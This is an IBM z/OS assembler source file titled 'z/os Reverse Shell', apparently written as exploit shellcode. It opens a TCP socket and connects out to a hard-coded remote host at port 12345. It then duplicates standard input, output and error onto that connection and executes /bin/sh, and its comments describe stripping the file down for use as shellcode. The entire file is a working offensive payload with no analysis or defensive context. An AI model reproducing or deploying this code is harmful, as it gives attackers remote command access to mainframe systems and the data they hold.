         TITLE  'z/os Reverse Shell'
NEWREV   CSECT
NEWREV   AMODE 31
NEWREV   RMODE 31
***********************************************************************
*         SETUP registers and save areas                              *
***********************************************************************
MAIN     LR    7,15            # R7 is base register
         NILH  7,X'1FFF'       # ensure local address
         USING MAIN,0          # R8 for addressability
         DS    0H              # halfword boundaries
         LA    1,ZEROES(7)     # address byond which should be all 0s
         XC    0(204,1),0(1)   # clear zero area
         LA    13,SAVEAREA(7)  # address of save area
         LHI   8,8             # R8 has static 8
         LHI   9,1             # R9 has static 1
         LHI   10,2            # R10 has static 2

***********************************************************************
*        BPX1SOC set up socket                                        *
***********************************************************************
BSOC     LA    0,@@F1(7)       # USS callable svcs socket
         LA    3,8             # n parms
         LA    5,DOM(7)        # Relative addr of First parm
         ST    10,DOM(7)       # store a 2 for AF_INET
         ST     9,TYPE(7)      # store a 1 for sock_stream
         ST     9,DIM(7)       # store a 1 for dim_sock
         LA    15,CLORUN(7)    # address of generic load & run
         BASR  14,15           # Branch to load & run

***********************************************************************
*        BPX1CON (connect) connect to rmt host                        *
***********************************************************************
BCON     L     5,CLIFD(7)      # address of client file descriptor
         ST    5,CLIFD2(7)     # store for connection call
***  main processing **
         LA    1,SSTR(7)       # packed socket string
         LA    5,CLIFD2(7)     # dest for our sock str
         MVC   7(9,5),0(1)     # mv packed skt str to parm array
         LA    0,@@F2(7)       # USS callable svcs connect
         LA    3,6             # n parms for func call
         LA    5,CLIFD2(7)     # src parm list addr
         LA    15,CLORUN(7)    # address of generic load & run
         BASR  14,15           # Branch to load & run

*************************************************
* Preparte the child pid we'll spawn            *
*  0) Dupe all 3 file desc of CLIFD             *
*  1) dupe parent read fd to std input          *
*************************************************
         LHI   11,2            # Loop Counter R11=2
@LOOP1   BRC   15,LFCNTL       # call FCNTL for each FD(in,out,err)
@RET1    AHI   11,-1           # Decrement R11
         CIJ   11,-1,7,@LOOP1  # if R11 >= 0, loop

***********************************************************************
*        BPX1EXC (exec) execute /bin/sh                               *
***********************************************************************
LEXEC    LA    1,EXCPRM1(7)    # top of arg list
******************************************
****  load array of addr and constants ***
******************************************
         ST    10,EXARG1L(7)   # arg 1 len is 2
         LA    2,EXARG1L(7)    # addr of len of arg1
         ST    2,16(0,1)       # arg4 Addr of Arg Len Addrs
         LA    2,EXARG1(7)     # addr of arg1
         ST    2,20(0,1)       # arg5 Addr of Arg Addrs
         ST    9,EXARGC(7)     # store 1 in ARG Count
**************************************************************
*** call the exec function the normal way ********************
**************************************************************
         LA    0,@@EX1(7)      # USS callable svcs EXEC
         LA    3,13            # n parms
         LA    5,EXCPRM1(7)    # src parm list addr
         LA    15,CLORUN(7)    # address of generic load & run
         BASR  14,15           # Branch to load & run

***********************************************************************
*** BPX1FCT (fnctl) Edit our file descriptor **************************
***********************************************************************
LFCNTL   LA    0,@@FC1(7)      # USS callable svcs FNCTL
         ST    8,@ACT(7)       # 8 is our dupe2 action
         L     5,CLIFD(7)      # client file descriptor
         ST    5,@FFD(7)       # store as fnctl argument
         ST    11,@ARG(7)      # fd to clone
         LA    3,6             # n parms
         LA    5,@FFD(7)       # src parm list addr
         LA    15,CLORUN(7)    # address of generic load & run
         BASR  14,15           # Branch to load & run
         BRC   15,@RET1        # Return to caller

***********************************************************************
*  LOAD and run R0=func name, R3=n parms                              *
*     R5 = src parm list                                              *
***********************************************************************
CLORUN   ST    14,8(,13)       # store ret address
         XR    1,1             # zero R1
         SVC   8               # get func call addr for R0
         ST    0,12(13)        # Store returned addr in our SA
         L     15,12(13)       # Load func addr into R15
         LHI   6,20            # offset from SA of first parm
         LA    1,0(6,13)       # start of dest parm list
@LOOP2   ST    5,0(6,13)       # store parms address in parm
         AHI   3,-1            # decrement # parm
         CIJ   3,11,8,@FIX     #  haky fix for EXEC func
@RETX    AHI   6,4             # increment dest parm addr
         AHI   5,4             # increment src parm addr
         CIJ   3,0,7,@LOOP2    # loop until R3 = 0
         LA    5,0(6,13)
         AHI   5,-4
         OI    0(5),X'80'      # last parm first bit high
@FIN1    BALR  14,15           # call function
         L     14,8(,13)       # set up return address
         BCR   15,14           # return to caller
@FIX     AHI    5,4            # need extra byte skipped for exec
         BRC   15,@RETX

***********************************************************************
*        Arg Arrays, Constants and Save Area                          *
***********************************************************************
         DS    0F
*************************
****  Func Names     ****
*************************
@@F1     DC    CL8'BPX1SOC '
@@F2     DC    CL8'BPX1CON '
@@EX1    DC    CL8'BPX1EXC '   # callable svcs name
@@FC1    DC    CL8'BPX1FCT '
*        # BPX1EXC Constants
EXARG1   DC    CL2'sh'         # arg 1 to exec
*        # BPX1CON Constants
SSTR     DC    X'1002023039ac103d0a'
*        # BPX1EXC Arguments
EXCPRM1  DS    0F              # actual parm list of exec call
EXCMDL   DC    F'7'            # len of cmd to exec
EXCMD    DC    CL7'/bin/sh'    # command to exec
*********************************************************************
******* Below this line is filled in runtime, but at compile ********
******* is all zeroes, so it can be dropped from the shell- *********
******* code as it will be dynamically added back and the ***********
******* offsets are already calulated in the code *******************
*********************************************************************
ZEROES   DS    0F              # 51 4 byte slots
EXARGC   DC    F'0'            # num of arguments
EXARGS   DC    10XL4'00000000' # reminaing exec args
EXARG1L  DC    F'0'            # arg1 length
*        # BPX1FCT Arguments
@FFD     DC    F'0'            # file descriptor
@ACT     DC    F'0'            # fnctl action
@ARG     DC    F'0'            # argument to fnctl
@RETFD   DC    F'0'            # fd return
FR1      DC    F'0'            # rtn code
FR2      DC    F'0'            # rsn code
*        # BPX1SOC Arguments
DOM      DC    F'0'            # AF_INET = 2
TYPE     DC    F'0'            # sock stream = 1
PROTO    DC    F'0'            # protocol ip = 0
DIM      DC    F'0'            # dim_sock = 1
CLIFD    DC    F'0'            # client file descriptor
SR1      DC    F'0'            # rtn val
SR2      DC    F'0'            # rtn code
SR3      DC    F'0'            # rsn code
*        # BPX1CON Arguments
CLIFD2   DC    F'0'            # CLIFD
SOCKLEN  DC    F'0'            # length of Sock Struct
SRVSKT   DC    XL2'0000'       # srv socket struct
         DC    XL2'0000'       # port
         DC    XL4'00000000'   # RHOST 0.0.0.0
CR1      DC    F'0'            # rtn val
CR2      DC    F'0'            # rtn code
CR3      DC    F'0'            # rsn code
SAVEAREA DC    18XL4'00000000' # save area for pgm mgmt
EOFMARK  DC    X'deadbeef'     # eopgm marker for shellcode
         END   MAIN
